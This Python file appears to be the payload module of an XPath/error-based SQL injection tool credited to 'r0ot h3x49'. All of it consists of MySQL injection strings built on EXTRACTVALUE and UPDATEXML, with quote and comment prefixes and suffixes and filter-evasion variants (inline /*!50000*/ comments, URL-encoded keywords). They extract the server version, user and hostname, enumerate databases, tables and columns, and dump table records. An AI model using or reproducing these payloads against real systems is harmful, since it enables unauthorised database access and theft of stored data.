#usr/bin/python
# Xpath SQL injection By r0ot h3x49
## Random String for test
Str = "r0ot"
Ste = Str.encode("hex","strict")
Str1 = "0x"+Ste
TITLE = "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)"
## MySQL Injection Type AND MySQL Comments
PREFIXES, SUFIXES = (" ", "' ", '" ', ") ", "') "),("", "AND'", "AND 1", "--+-", "%23", "AND '1")

# Test Queries for extractvalue()
TESTS = ("AND UPDATEXML(0,CONCAT/**_**/(0x7e,"+str(Str1)+"),0)",
         "AND+EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+"))",
         "AND+UPDATEXML(0,CONCAT(0x7e,"+str(Str1)+"),0)",
         "Procedure+Analyse(EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+")),1)",
         "AND EXTRACTVALUE(0,CONCAT(0x7e,"+str(Str1)+"))",
         "Procedure Analyse/**_**/(EXTRACTVALUE/**_**/(0,CONCAT/**_**/(0x7e,"+str(Str1)+")),1)",
         "AND EXTRACTVALUE/**_**/(0,CONCAT/**_**/(0x7e,"+str(Str1)+"))",
         "AND EXTRACTVALUE/*!50000(0,CONCAT/*!50000(0x7e,"+str(Str1)+")*/)*/")

## extractvalue banner queries
BANNER = ("VERSION()",
          "@@VERSION",
          "@@GLOBAL_VERSION",
          "VERSION/**_**/()",
          "VERSION/*!50000()*/")

## extractvalue current database queries
CURRENTDB = ("DATABASE()",
             "SCHEMA()",
             "SCHEMA/*!50000()*/",
             "DATABASE/**_**/()",
             "DATABASE/*!50000()*/")

CURRENTUSER = ("USER()",
               "CURRENT_USER",
               "CURRENT_USER()",
               "SESSION_USER()",
               "SYSTEM_USER()")

HOSTNAMES = ("@@hostname","@@HOSTNAME")

## extractvalue database count queries
#DB_COUNT = ("(SELECT COUNT(*)FROM INFORMATION_SCHEMA.SCHEMATA)", "(SELECT COUNT(SCHEMA_NAME)FROM INFORMATION_SCHEMA.SCHEMATA)", "(/*!50000SELECT*/ COUNT/*!50000(*)*//*!50000FROM*/ /*!50000INFORMATION_SCHEMA*/./*!50000SCHEMATA*/)", "(/*!50000%53ELECT*/ COUNT(/*!50000SCHEMA_NAME*/)/*!50000%46ROM*/ /*!50000%49NFORMATION_%53CHEMA.%53CHEMATA*/)")
DB_COUNT = ("(/*!50000%53ELECT*//**/COUNT(/*!50000SCHEMA_NAME*/)/*!50000%46ROM*//**//*!50000%49NFORMATION_%53CHEMA*/./*!50000%53CHEMATA*/)",
            "(select%20count(*)from(information_schema.schemata))",
            "(SELECT+COUNT(*)FROM+INFORMATION_SCHEMA.SCHEMATA)",
            "(/*!50000SELECT*/ COUNT(/*!50000**/)/*!50000FROM*/ /*!50000INFORMATION_SCHEMA.SCHEMATA*/)")

## extractvalue database names fetching queries
#DB_NAMES = ("(SELECT CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT/**_**/0,1)", "(SELECT CONCAT/**_**/(SCHEMA_NAME)FROM INFORMATION_SCHEMA./**/SCHEMATA LIMIT/**_**/0,1)" ,"(/*!50000SELECT*/ CONCAT/**_**/(/*!50000SCHEMA_NAME*/)/*!50000FROM*/ /*!50000INFORMATION_SCHEMA*/./*!50000SCHEMATA*/ LIMIT/**_**/0,1)", "(/*!50000%53ELECT*/ CONCAT/*!50000(SCHEMA_NAME)*//*!50000FROM*/ /*!50000%49NFORMATION_%53CHEMA.%53CHEMATA*/ LIMIT/**_**/0,1)")
DB_NAMES = ("(SELECT+CONCAT(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT%200,1)","(/*!50000%53ELECT*//**/CONCAT/**_**/(/*!50000%53CHEMA_NAME*/)/*!50000%46ROM*//**//*!50000%49NFORMATION_%53CHEMA.%53CHEMATA*//**/LIMIT/**_**/0,1)",
            "(/*!50000%53ELECT*//**/CONCAT/**_**/(/*!50000%53CHEMA_NAME*/)/*!50000%46ROM*//**//*!50000%49NFORMATION_%53CHEMA.%53CHEMATA*//**/LIMIT+0,1)",
            "(SELECT+CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT/**_**/0,1)",
            "(SELECT+CONCAT(SCHEMA_NAME)+FROM+INFORMATION_SCHEMA.SCHEMATA+LIMIT+0,1)",
            "(/*!50000SELECT*/ CONCAT/**_**/(/*!50000SCHEMA_NAME*/)/*!50000FROM*/ /*!50000INFORMATION_SCHEMA*/./*!50000SCHEMATA*/ LIMIT/**_**/0,1)",
            "(/*!50000SELECT*/ CONCAT/**_**/(/*!50000SCHEMA_NAME*/)/*!50000FROM*/ /*!50000INFORMATION_SCHEMA*/./*!50000SCHEMATA*/ LIMIT+0,1)")


## extractvalue db specific table count queries
TBL_COUNT_FROM_DBS = ("(SELECT%%20COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x%s))",
                      "(Select%%20count(*)from(information_schema.tables)where(table_schema%%20like%%200x%s))",
                      "(SELECT+COUNT(*)FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+LIKE+0x%s)",
                      "(SELECT/**/COUNT(*)FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA/**/LIKE/**_**/0x%s)",
                      "(/*!50000SELECT*//**/COUNT(/*!50000**/)/*!50000FROM*//**//*!50000INFORMATION_SCHEMA.TABLES*//**//*!50000WHERE*//**//*!50000TABLE_SCHEMA*//**/LIKE/**_**/0x%s)",
                      "(/*!50000SELECT*/+COUNT(*)/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/./*!50000TABLES*/+/*!50000WHERE*/+/*!50000TABLE_SCHEMA*/+LIKE+0x%s)")

## extractvalue db specific table dump queries
TBL_DUMP_FROM_DBS = (#"(select%%20concat%%20(table_name)from(information_schema.tables)where(table_schema=database())/*%s*/LIMIT+0,1)",
                     "(SELECT%%20CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x%s)LIMIT%%200,1)",
                     "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000TABLE_NAME*/)/*!50000FROM*//**//*!50000INFORMATION_SCHEMA.TABLES*//**//*!50000WHERE*//**//*!50000TABLE_SCHEMA*//**/LIKE/**/0x%s/**/LIMIT/**_**/0,1)",
                     "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000TABLE_NAME*/)/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000WHERE*/+/*!50000TABLE_SCHEMA*/+LIKE+0x%s+LIMIT+0,1)",
                     "(SELECT/**/CONCAT(TABLE_NAME)FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA/**/LIKE/**/0x%s/**/LIMIT/**_**/0,1)",
                     "(SELECT+CONCAT(TABLE_NAME)FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+LIKE+0x%s+LIMIT+0,1)",
                     "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000TABLE_NAME*/)/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/./*!50000TABLES*/+/*!50000WHERE*/+/*!50000TABLE_SCHEMA*/+LIKE+0x%s+LIMIT/**_**/0,1)",
                     "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000TABLE_NAME*/)/*!50000FROM*//**//*!50000INFORMATION_SCHEMA*/./*!50000TABLES*//**//*!50000WHERE*//**//*!50000TABLE_SCHEMA*//**/LIKE/**/0x%s/**/LIMIT+0,1)")


## extractvalue db specific column count queries
COL_COUNT_FROM_TBL = ("(SELECT%%20COUNT(column_name)FROM(INFORMATION_SCHEMA.COLUMNS)/*%s*/WHERE(TABLE_NAME=0x%s))",
                      "(SELECT%%20COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLES_SCHEMA=0x%s)AND(TABLE_NAME=0x%s))",
                      "(Select%%20count(*)from(information_schema.columns)where(table_schema%%20like%%200x%s)and(table_name%%20like%%200x%s))",
                      "(SELECT+COUNT(*)FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+LIKE+0x%s+AND+TABLE_NAME+LIKE+0x%s)",
                      "(SELECT/**/COUNT(*)FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_SCHEMA/**/LIKE/**/0x%s/**/AND/**/TABLE_NAME/**/LIKE/**/0x%s)",
                      "(/*!50000SELECT*//**/COUNT(/*!50000**/)/*!50000FROM*//**//*!50000INFORMATION_SCHEMA.COLUMNS*//**//*!50000WHERE*//**//*!50000TABLE_SCHEMA*//**/LIKE/**/0x%s/**/AND/**//*!50000TABLE_NAME*//**/LIKE/**/0x%s)",
                      "(/*!50000SELECT*/+COUNT(*)/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/./*!50000COLUMNS*/+/*!50000WHERE*/+/*!50000TABLE_SCHEMA*/+LIKE+0x%s+AND+/*!50000TABLE_NAME*/+LIKE+0x%s)")



## extractvalue db specific column dump queries
COL_DUMP_FROM_TBL = ("(SELECT%%20CONCAT%%20(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA=0x%s)AND(TABLE_NAME=0x%s)LIMIT%%200,1)",
                     "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000COLUMN_NAME*/)/*!50000FROM*//**//*!50000INFORMATION_SCHEMA.COLUMNS*//**//*!50000WHERE*//**//*!50000TABLE_SCHEMA*//**/LIKE/**/0x%s/**/AND/**//*!50000TABLE_NAME*//**/LIKE/**/0x%s/**/LIMIT/**_**/0,1)",
                     "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000COLUMN_NAME*/)/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.COLUMNS*/+/*!50000WHERE*/+/*!50000TABLE_SCHEMA*/+LIKE+0x%s+AND+/*!50000TABLE_NAME*/+LIKE+0x%s+LIMIT+0,1)",
                     "(SELECT/**/CONCAT(COLUMN_NAME)FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_SCHEMA/**/LIKE/**/0x%s/**/AND/**/TABLE_NAME/**/LIKE/**/0x%s/**/LIMIT/**_**/0,1)",
                     "(SELECT+CONCAT(COLUMN_NAME)FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+LIKE+0x%s+AND+TABLE_NAME+LIKE+0x%s+LIMIT+0,1)",
                     "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000COLUMN_NAME*/)/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/./*!50000COLUMNS*/+/*!50000WHERE*/+/*!50000TABLE_SCHEMA*/+LIKE+0x%s+AND+/*!50000TABLE_NAME*/+LIKE+0x%s+LIMIT/**_**/0,1)",
                     "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000COLUMN_NAME*/)/*!50000FROM*//**//*!50000INFORMATION_SCHEMA*/./*!50000COLUMNS*//**//*!50000WHERE*//**//*!50000TABLE_SCHEMA*//**/LIKE/**/0x%s/**/AND/**//*!50000TABLE_NAME*//**/LIKE/**/0x%s/**/LIMIT+0,1)")


## extractvalue tbl records count queries
REC_COUNT_FROM_TBL = ("(SELECT%%20COUNT(*)FROM(%s.%s))",
                      "(/*!50000Select*/%%20count(/*!50000**/)/*!50000from*/(/*!50000%s*/./*!50000%s*/))",
                      "(SELECT+COUNT(*)FROM+%s.%s)",
                      "(/*!50000SELECT*/+COUNT(/*!50000**/)/*!50000FROM*/+/*!50000%s.%s*/)",
                      "(SELECT/**/COUNT(*)FROM/**/%s.%s)",
                      "(/*!50000SELECT*//**/COUNT(/*!50000**/)/*!50000FROM*//**//*!50000%s.%s*/)")


## extractvalue tbl records dump queries
REC_DUMP_FROM_TBL = ("(SELECT%%20CONCAT(%s)FROM(%s.%s)LIMIT%%200,1)",
                     "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000%s*/)/*!50000FROM*//**//*!50000%s.%s*//**/LIMIT/**_**/0,1)",
                     "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000%s*/)/*!50000FROM*/+/*!50000%s.%s*/+LIMIT+0,1)",
                     "(SELECT/**/CONCAT(%s)FROM/**/%s.%s/**/LIMIT/**_**/0,1)",
                     "(SELECT+CONCAT(%s)FROM+%s.%s+LIMIT+0,1)",
                     "(/*!50000SELECT*/+CONCAT/**_**/(%s)/*!50000FROM*/+/*!50000%s*/./*!50000%s*/+LIMIT+0,1)",
                     "(/*!50000SELECT*//**/CONCAT(%s)/*!50000FROM*//**//*!50000%s*/./*!50000%s*//**/LIMIT/**_**/0,1)")

